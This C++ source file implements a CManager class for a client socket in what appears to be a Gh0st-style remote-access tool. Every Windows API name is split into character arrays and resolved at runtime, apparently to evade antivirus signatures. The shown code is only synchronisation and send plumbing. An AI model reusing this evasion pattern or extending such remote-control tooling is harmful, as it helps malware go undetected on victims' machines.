// Manager.cpp: implementation of the CManager class.
//
//////////////////////////////////////////////////////////////////////
#include "../Declare.h"   //动态调用库函数
#include "Manager.h"
#include "until.h"

//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////

CManager::CManager(CClientSocket *pClient)
{
	m_pClient = pClient;
	m_pClient->setManagerCallBack(this);

	/*
	bManualReset 
	[in] Specifies whether a manual-reset or auto-reset event object is created. If TRUE, then you must use the ResetEvent function to manually reset the state to nonsignaled. If FALSE, the system automatically resets the state to nonsignaled after a single waiting thread has been released. 
	*/
	// 第二个参数为true,禁止系统自动重置事件
	char BrmAP22[] = {'C','r','e','a','t','e','E','v','e','n','t','A','\0'};
	CreateEventAT pCreateEventA=(CreateEventAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP22);
	m_hEventDlgOpen = pCreateEventA(NULL, true, false, NULL);
}

CManager::~CManager()
{
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(m_hEventDlgOpen);
}
void CManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	
}

int CManager::Send(LPBYTE lpData, UINT nSize)
{
	int	nRet = 0;
	try
	{
		nRet = m_pClient->Send((LPBYTE)lpData, nSize);
	}catch(...){};
	return nRet;
}

void CManager::WaitForDialogOpen()
{
    char BrmAP30[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
    WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	pWaitForSingleObject(m_hEventDlgOpen, INFINITE);
	// 必须的Sleep,因为远程窗口从InitDialog中发送COMMAND_NEXT到显示还要一段时间
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	pSleep(150);
}

void CManager::NotifyDialogIsOpen()
{
	char BrmAP23[] = {'S','e','t','E','v','e','n','t','\0'};
	SetEventT pSetEvent=(SetEventT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP23);
	pSetEvent(m_hEventDlgOpen);
}
